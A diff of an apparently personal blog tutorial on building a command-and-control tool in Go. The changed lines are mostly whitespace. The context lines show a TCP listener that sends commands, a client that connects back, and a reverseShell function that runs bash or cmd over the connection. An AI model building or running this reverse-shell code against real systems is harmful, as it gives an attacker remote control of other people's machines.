@@ -1,5 +1,5 @@
 ---
-title: Build Golang c2 - Part 1
+title: "Build c2 - Part 1"
 date: 2023-10-20
 description: Start with a client that can read server's command and send result back
 categories: ['golang']
@@ -16,7 +16,7 @@ To start off, our server need following functionality:
 2. Read command from stdin
 3. Send command to client
 
-### Listen for tcp connection 
+### Listen for tcp connection
 
 ```go
 func main() {
@@ -30,7 +30,7 @@ func main() {
     fmt.Printf("[+] Waiting for connection on %s\n", ln.Addr().String())
     conn, err := ln.Accept()
     if err != nil {
-    	log.Fatal(err)
+        log.Fatal(err)
     }
 
     fmt.Printf("[+] Connection from %s\n", conn.RemoteAddr())
@@ -48,7 +48,6 @@ Create a new function called `input`, takes in a string, return what we have inp
 
 Using `bufio.NewScanner()`, it will strip the `\n` at the end.
 
-
 ```go
 for input(p string) []byte {
   fmt.Printf(p)
@@ -59,7 +58,6 @@ for input(p string) []byte {
   }
   return scanner.Bytes()
 }
-
 ```
 
 ### Send command to client
@@ -121,7 +119,7 @@ func main() {
     fmt.Printf("[-] Tcp Errpr %v\n", err)
     return
   }
-  
+
   defer conn.Close()
   fmt.Printf("[+] Connected to %s!\n", host)
   // Loop reading commands from server and print it out.
@@ -384,7 +382,7 @@ func netshell(conn net.Conn, send chan []byte, recv chan []byte) {
   // Check windows/linux
   shellpath := "/bin/bash"
   if runtime.GOOS == "windows" {
-  	shellpath = "cmd"
+      shellpath = "cmd"
   }
   reverseShell(shellpath, send, recv)
 }
@@ -400,7 +398,7 @@ func reverseShell(path string, send chan<- []byte, recv <-chan []byte) {
   defer func() {
     cancel()  
   }()
- 
+
   cmd := exec.Command(path)
   stdin, _ := cmd.StdinPipe()
   stdout, _ := cmd.StdoutPipe()
@@ -414,7 +412,7 @@ func reverseShell(path string, send chan<- []byte, recv <-chan []byte) {
       case input := <-recv:
         stdin.Write(append(input, byte('\n')))
       case <-ctx.Done():
-	      return
+          return
       }
     }
   }()
@@ -477,15 +475,3 @@ Transfer it to windows machine and run it... And it works. This is a showcase pr
 > - https://github.com/BishopFox/sliver.git
 > - https://github.com/moloch--/gshell.git
 > - https://blog.kowalczyk.info/article/wOYk/advanced-command-execution-in-go-with-osexec.html
-   
-
-
-
-
-
-
-
-
-
-
-
